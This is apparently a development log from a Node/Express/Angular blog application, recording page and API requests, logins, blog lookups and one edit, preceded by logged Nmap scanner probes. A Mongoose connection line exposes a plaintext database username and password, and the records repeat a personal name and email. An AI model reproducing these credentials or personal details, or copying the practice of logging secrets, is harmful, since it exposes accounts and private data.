+[0mPOST /sdk [32m200 [0m0.638 ms - 4536[0m
+[0mGET /nmaplowercheck1604538749 [32m200 [0m0.905 ms - 4536[0m
+[0mGET /NmapUpperCheck1604538749 [32m200 [0m0.719 ms - 4536[0m
+[0mGET /Nmap/folder/check1604538749 [32m200 [0m0.669 ms - 4536[0m
+[0mGET / [32m200 [0m0.653 ms - 4536[0m
+(node:6217) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
+(node:6217) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
+Mongoose connected to mongodb://cjfield:inprison@localhost/blogger
+[0mGET / [36m304 [0m4.769 ms - -[0m
+[0mGET /js/angular.min.js [36m304 [0m1.285 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m0.914 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.354 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.738 ms - -[0m
+[0mGET /css/fontawesome-all.css [36m304 [0m0.675 ms - -[0m
+[0mGET /js/angular-ui-router.min.js [36m304 [0m1.106 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m0.444 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m0.744 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.600 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.629 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.977 ms - -[0m
+Getting Blog List
+[
+  {
+    _id: 5fa4c61de84f95182b006383,
+    blogTitle: 'Test Blog',
+    blogText: "To show Rogers he can't touch my stuff",
+    name: 'Connor J Field',
+    email: 'cfield167@gmail.com',
+    createdOn: 2020-11-06T03:42:21.211Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m19.688 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m11.215 ms - -[0m
+[0mGET /common/auth/login.view.html [36m304 [0m0.603 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.584 ms - -[0m
+[0mPOST /api/login [33m401 [0m26.013 ms - 33[0m
+[0mPOST /api/login [32m200 [0m14.104 ms - 252[0m
+[0mGET /favicon.ico [36m304 [0m0.725 ms - -[0m
+Getting Blog List
+[
+  {
+    _id: 5fa4c61de84f95182b006383,
+    blogTitle: 'Test Blog',
+    blogText: "To show Rogers he can't touch my stuff",
+    name: 'Connor J Field',
+    email: 'cfield167@gmail.com',
+    createdOn: 2020-11-06T03:42:21.211Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.262 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.798 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.709 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m2.109 ms - -[0m
+[0mPOST /api/login [32m200 [0m12.641 ms - 256[0m
+[0mGET /favicon.ico [36m304 [0m0.729 ms - -[0m
+Getting Blog List
+[
+  {
+    _id: 5fa4c61de84f95182b006383,
+    blogTitle: 'Test Blog',
+    blogText: "To show Rogers he can't touch my stuff",
+    name: 'Connor J Field',
+    email: 'cfield167@gmail.com',
+    createdOn: 2020-11-06T03:42:21.211Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [36m304 [0m3.173 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.707 ms - -[0m
+[0mGET /webfonts/fa-solid-900.woff2 [36m304 [0m0.663 ms - -[0m
+Finding blog details { blogid: '5fa4c61de84f95182b006383' }
+{
+  _id: 5fa4c61de84f95182b006383,
+  blogTitle: 'Test Blog',
+  blogText: "To show Rogers he can't touch my stuff",
+  name: 'Connor J Field',
+  email: 'cfield167@gmail.com',
+  createdOn: 2020-11-06T03:42:21.211Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa4c61de84f95182b006383 [32m200 [0m4.113 ms - 211[0m
+[0mGET /favicon.ico [36m304 [0m0.613 ms - -[0m
+Finding blog details { blogid: '5fa4c61de84f95182b006383' }
+{
+  _id: 5fa4c61de84f95182b006383,
+  blogTitle: 'Test Blog',
+  blogText: "To show Rogers he can't touch my stuff",
+  name: 'Connor J Field',
+  email: 'cfield167@gmail.com',
+  createdOn: 2020-11-06T03:42:21.211Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa4c61de84f95182b006383 [36m304 [0m3.368 ms - -[0m
+Finding blog details { blogid: '5fa4c61de84f95182b006383' }
+{
+  _id: 5fa4c61de84f95182b006383,
+  blogTitle: 'Test Blog',
+  blogText: "To show Rogers he can't touch my stuff",
+  name: 'Connor J Field',
+  email: 'cfield167@gmail.com',
+  createdOn: 2020-11-06T03:42:21.211Z,
+  __v: 0
+}
+[0mGET /api/blogs/5fa4c61de84f95182b006383 [36m304 [0m2.567 ms - -[0m
+[0mPUT /api/blogs/5fa4c61de84f95182b006383 [32m200 [0m14.963 ms - 207[0m
+Getting Blog List
+[
+  {
+    _id: 5fa4c61de84f95182b006383,
+    blogTitle: 'Test Blog',
+    blogText: 'I hope you have a great day today!',
+    name: 'Connor J Field',
+    email: 'cfield167@gmail.com',
+    createdOn: 2020-11-06T03:42:21.211Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m2.514 ms - 201[0m
+[0mGET /favicon.ico [36m304 [0m0.637 ms - -[0m
+[0mGET /favicon.ico [36m304 [0m0.665 ms - -[0m
+[0mGET / [36m304 [0m0.892 ms - -[0m
+[0mGET /js/angular.min.js [36m304 [0m0.905 ms - -[0m
+[0mGET /js/angular-route.min.js [36m304 [0m0.806 ms - -[0m
+[0mGET /stylesheets/style.css [36m304 [0m0.317 ms - -[0m
+[0mGET /css/bootstrap.min.css [36m304 [0m0.700 ms - -[0m
+[0mGET /css/fontawesome-all.css [36m304 [0m0.738 ms - -[0m
+[0mGET /js/angular-ui-router.min.js [36m304 [0m0.747 ms - -[0m
+[0mGET /bloggerApp.js [36m304 [0m0.399 ms - -[0m
+[0mGET /auth/authentication.js [36m304 [0m0.550 ms - -[0m
+[0mGET /nav/navigation.js [36m304 [0m0.753 ms - -[0m
+[0mGET /nav/navigation.html [36m304 [0m0.738 ms - -[0m
+[0mGET /favicon.ico [32m200 [0m3.362 ms - 4752[0m
